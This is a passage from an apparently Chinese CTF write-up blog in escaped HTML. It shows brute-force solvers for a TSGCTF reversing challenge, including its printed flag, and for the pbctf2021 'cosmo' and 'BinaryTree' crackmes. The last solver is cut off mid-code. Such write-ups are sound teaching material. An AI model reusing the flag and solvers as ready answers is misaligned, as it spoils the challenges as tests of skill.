style=&#34;color:#ae81ff&#34;&gt;0x46680B140EFF&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffffffffffff&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3A2D3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3FFFF&lt;/span&gt;):
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;v9 = &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;i&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, hex(i))
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4D935BBD3E0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffffffffffff&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4D935BBD3E0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x5563&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (((i &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x66B9B431B9ED&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffffffffffff&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x27DF9&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3FFFF&lt;/span&gt;):
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;v10 = &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;i&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, hex(i))
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1E5D2BE81C5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffffffffffff&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1E5D2BE81C5&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x133E7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (((i &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x448626500938&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffffffffffff&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3BC65&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3FFFF&lt;/span&gt;):
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;v11 = &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;i&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, hex(i))
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffff&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;):
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;time: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(i)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;跑亿会就行&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;$ ./optimized-unpacked
Enter password: &lt;span style=&#34;color:#ae81ff&#34;&gt;772928896&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2204180909&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4273479145&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1334930147&lt;/span&gt;
TSGCTF&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;F457_m0dul0!&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;@
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;pbctf2021&#34;&gt;pbctf2021&lt;/h2&gt;
&lt;h3 id=&#34;cosmo&#34;&gt;cosmo&lt;/h3&gt;
&lt;p&gt;main函数在 &lt;code&gt;sub_403066&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;要求长度是38，简单看了一下加密逻辑，发现是两个字符一起加密并验证，还想用pintools试试，结果发现根本跑不起来&lt;/p&gt;
&lt;p&gt;于是又开始了快乐的手写爆破，不过这个比较简单，动调一下就知道只用了最下面的几行加密逻辑&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; qword_40C000[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
    &lt;span style=&#34;color:#ae81ff&#34;&gt;21233875ll&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;69468586ll&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;146735755ll&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;251265871ll&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;379651085ll&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;536872170ll&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;719455639ll&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;924911196ll&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;1158088491ll&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;1412368333ll&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;1695680674ll&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;2005272944ll&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;2341407284ll&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;2698316511ll&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;3076262773ll&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;3483634782ll&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;3913551105ll&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;72486322ll&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;548474478ll&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0ll&lt;/span&gt;
};

&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;encrypt&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; len, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; cur){
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; len;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; qword_40C000[cur &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v3 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v3 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xffff&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt;(v5){
        v7 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a;
        v6 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; v7;
        &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;v5;
        &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;a;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (v7 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFFF0&lt;/span&gt;)
        v7 &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFFF1&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; v7 &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; ((v6 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFFF1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;);
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_cnt&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; cnt){
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;){
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;; j &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80&lt;/span&gt;; j&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;){
            &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; a[] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {i, j};
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (encrypt(a, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, cnt) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; qword_40C000[cnt]){
                printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%c%c&amp;#34;&lt;/span&gt;, i, j);
                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
            }
        }
    }
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(){
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pbctf{&amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;)
        test_cnt(i);
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;除了找main函数之外也没有什么特别的&lt;/p&gt;
&lt;h3 id=&#34;binarytree&#34;&gt;BinaryTree&lt;/h3&gt;
&lt;p&gt;这题逻辑还是比较清晰的，就是根据800bit的输入进行了800层SMC&lt;/p&gt;
&lt;p&gt;每一层都会对寄存器进行一个加法，然后决定下一个SMC的结果，大概是&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;  jz Label
  mov r8, [rdi + 0x____]    ; 具体寄存器忘了，随便写了个，中间一堆nop省略了
  add r9, 0x__
Label:
  mov r8, [rdi + 0x____]
  add r9, 0x__
  jmp SMC
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;最后一层就是对寄存器进行cmp，小于等于某个值就行&lt;/p&gt;
&lt;p&gt;一开始还想着出题人仁慈一点，贪心就是最小（想直接用idapython自动跑），结果直接gg&lt;/p&gt;
&lt;p&gt;队友对每一层的可能性进行了遍历，发现每一层最多有16种可能&lt;/p&gt;
&lt;p&gt;于是这题就成了有向无环图求单源最短路径&lt;/p&gt;
&lt;p&gt;求解代码可以分成三个部分：从SMC结果提取关键数据，建图，跑SPFA&lt;/p&gt;
&lt;p&gt;其中SPFA是抄的，路径输出稍微修改一下就行&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;algorithm&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;vector&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;queue&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;cstdlib&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;cstdio&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;cmath&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;cstring&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;namespace&lt;/span&gt; std;

&lt;span style=&#34;color:#75715e&#34;&gt;#define INF 0xfffffff
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define MAXN 16 * 800 + 5
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Cur_smc&lt;/span&gt;{
    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; bytecode[&lt;span style=&#34;color:#ae81ff&#34;&gt;0x30&lt;/span&gt;];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; depth;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; len[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;];
};
Cur_smc cur_smc_code[MAXN];

&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; smc_xor_code[&lt;span style=&#34;color:#ae81ff&#34;&gt;0xFFFFF&lt;/span&gt;];

&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Edge&lt;/span&gt;{
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; to;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; len;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; path;
    Edge(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; to, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; len, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; path)&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; to(to), len(len), path(path) {}
};

vector &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;Edge&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; G[MAXN];
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; dist[MAXN];

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; FLAG_exist;

&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;my_strncmp&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;b, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; length){
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; length; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i){
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (a[i] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; b[i])
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; false;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; true;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;analysis_next&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; cur, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; direction){
    &lt;span style=&#34;color:#75715e&#34;&gt;// direction == 0 for bellow, direction == 1 for above
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (cur_smc_code[cur].bytecode[i] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\x90&amp;#39;&lt;/span&gt;){
        &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i;
    } &lt;span style=&#34;color:#75715e&#34;&gt;// pass &amp;#34;nop&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; end_left &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; index_xor &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; START &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; END &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (cur_smc_code[cur].bytecode[i] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\x74&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// always starts as &amp;#34;jz label1&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        end_left &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cur_smc_code[cur].bytecode[&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (direction &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;){        &lt;span style=&#34;color:#75715e&#34;&gt;// if input bit is 1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        START &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
        END &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; end_left;
    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (direction &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;){  &lt;span style=&#34;color:#75715e&#34;&gt;// if input bit is 0
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        START &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; end_left;
        END &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; START; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; END; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i){
        &lt;span style=&#34;color:#75715e&#34;&gt;// read &amp;#34;add r9, xx&amp;#34;
